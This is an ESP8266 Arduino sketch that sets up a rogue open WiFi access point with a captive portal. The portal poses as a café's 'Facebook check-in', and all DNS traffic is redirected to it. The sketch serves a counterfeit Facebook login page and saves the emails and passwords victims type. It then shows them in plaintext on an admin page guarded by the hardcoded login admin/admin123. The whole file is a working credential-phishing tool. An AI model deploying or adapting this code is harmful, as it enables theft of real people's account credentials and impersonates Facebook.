#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <vector>

const byte DNS_PORT = 53;
IPAddress apIP(172, 217, 28, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

const char *adminUsername = "admin";
const char *adminPassword = "admin123";

struct Credentials {
  String username;
  String password;
};

std::vector<Credentials> credentialsHistory;

String responseHTML = ""
                      "<!DOCTYPE html><html lang='en'><head>"
                      "<meta charset='UTF-8'>"
                      "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                      "<title>Rede WiFi</title>"
                      "<style>"
                      "@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');"
                      "* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }"
                      ".container { padding: 0 15px; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: #f0f2f5; }"
                      ".welcome-message { text-align: center; margin-bottom: 20px; }"
                      ".facebook-button { background: #1877f2; color: #fff; padding: 15px 30px; border: none; border-radius: 6px; font-size: 1.25rem; cursor: pointer; transition: background 0.2s ease; text-decoration: none; }"
                      ".facebook-button:hover { background: #0d65d9; }"
                      "</style>"
                      "</head><body>"
                      "<script>"
                      "function redirectToFacebookLogin() {"
                      "  window.location.href = 'http://' + window.location.hostname + '/facebook_login';"
                      "}"
                      "</script>"
                      "<div class='container'>"
                      "<div class='welcome-message'>"
                      "<h1>Bem-vindo à Rede WiFi</h1>"
                      "<p>Para se conectar à rede, faça check-in no Facebook no nosso café ;).</p>"
                      "</div>"
                      "<button class='facebook-button' onclick='redirectToFacebookLogin()'>Fazer Check-In no Facebook</button>"
                      "</div>"
                      "</body></html>";

void handleFacebookLogin() {
  const char* loginPageHTML = R"(
                                  <!DOCTYPE html>
                                  <html lang="en">
                                  <head>
                                    <meta charset="UTF-8">
                                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                                    <title>Login Page</title>
                                    <style>
                                      body {
                                        font-family: 'Roboto', sans-serif;
                                        background-color: #f0f2f5;
                                        margin: 0;
                                        padding: 0;
                                      }

                                      .container {
                                        max-width: 400px;
                                        margin: 0 auto;
                                        padding: 20px;
                                        background-color: #fff;
                                        border-radius: 8px;
                                        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
                                        margin-top: 50px;
                                      }

                                      h1 {
                                        color: #1877f2;
                                        font-size: 2rem;
                                        margin-bottom: 10px;
                                      }

                                      p {
                                        font-size: 1rem;
                                        margin-bottom: 20px;
                                      }

                                      input {
                                        height: 35px;
                                        width: 100%;
                                        border: 1px solid #ccc;
                                        border-radius: 6px;
                                        margin-bottom: 15px;
                                        font-size: 1rem;
                                        padding: 0 10px;
                                      }

                                      button {
                                        border: none;
                                        cursor: pointer;
                                        background: #1877f2;
                                        padding: 10px;
                                        border-radius: 6px;
                                        color: #fff;
                                        font-size: 1rem;
                                        font-weight: 600;
                                        transition: 0.2s ease;
                                      }

                                      button:hover {
                                        background: #0d65d9;
                                      }

                                      a {
                                        text-decoration: none;
                                        color: #1877f2;
                                        font-size: 0.875rem;
                                      }

                                      hr {
                                        border: none;
                                        height: 1px;
                                        background-color: #ccc;
                                        margin-bottom: 20px;
                                        margin-top: 20px;
                                      }
                                    </style>
                                  </head>
                                  <body>
                                    <div class="container">
                                      <h1>Facebook</h1>
                                      <p>Connect with friends and the world around you on Facebook.</p>
                                      <form action="/login" method="post">
                                        <label for="email">Email:</label>
                                        <input type="email" id="email" name="email" required><br>
                                        <label for="password">Password:</label>
                                        <input type="password" id="password" name="password" required><br>
                                        <button type="submit">Login</button>
                                        <a href="#" class="forgot">Forgot password?</a>
                                      </form>
                                      <hr>
                                      <div class="button">
                                        <a href="#">Create new account</a>
                                      </div>
                                    </div>
                                  </body>
                                  </html>
                                )";

  webServer.send(200, "text/html", loginPageHTML);
}

void handleAdmin() {
  if (!webServer.authenticate(adminUsername, adminPassword)) {
    return webServer.requestAuthentication();
  }

  String adminPageHTML = "<!DOCTYPE html><html lang='en'><head>"
                          "<meta charset='UTF-8'>"
                          "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                          "<title>Admin Page</title>"
                          "<style>"
                          "@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');"
                          "* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }"
                          ".container { padding: 0 15px; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: #f0f2f5; }"
                          ".credentials-table { width: 80%; border-collapse: collapse; margin-top: 20px; }"
                          ".credentials-table th, .credentials-table td { border: 1px solid #ddd; padding: 8px; text-align: left; }"
                          ".credentials-table th { background-color: #f2f2f2; }"
                          "</style>"
                          "</head><body>"
                          "<div class='container'>"
                          "<h1>Admin Page</h1>"
                          "<table class='credentials-table'>"
                          "<thead>"
                          "<tr>"
                          "<th>Username</th>"
                          "<th>Password</th>"
                          "</tr>"
                          "</thead>"
                          "<tbody>";

  for (const auto& credentials : credentialsHistory) {
    adminPageHTML += "<tr>"
                     "<td>" + credentials.username + "</td>"
                     "<td>" + credentials.password + "</td>"
                     "</tr>";
  }

  adminPageHTML += "</tbody>"
                   "</table>"
                   "</div></body></html>";

  webServer.send(200, "text/html", adminPageHTML);
}


void handleLoginSubmit() {
  if (webServer.hasArg("email") && webServer.hasArg("password")) {
    Credentials credentials;
    credentials.username = webServer.arg("email");
    credentials.password = webServer.arg("password");
    credentialsHistory.push_back(credentials);
  }
  webServer.sendHeader("Location", "/admin", true);
  webServer.send(302, "text/plain", "");
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("Wifi-Clientes");
  dnsServer.start(DNS_PORT, "*", apIP);

  webServer.on("/admin", HTTP_GET, handleAdmin);
  webServer.on("/facebook_login", HTTP_GET, handleFacebookLogin);
  webServer.on("/login", HTTP_POST, handleLoginSubmit);

  webServer.onNotFound([]() {
    webServer.send(200, "text/html", responseHTML);
  });

  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}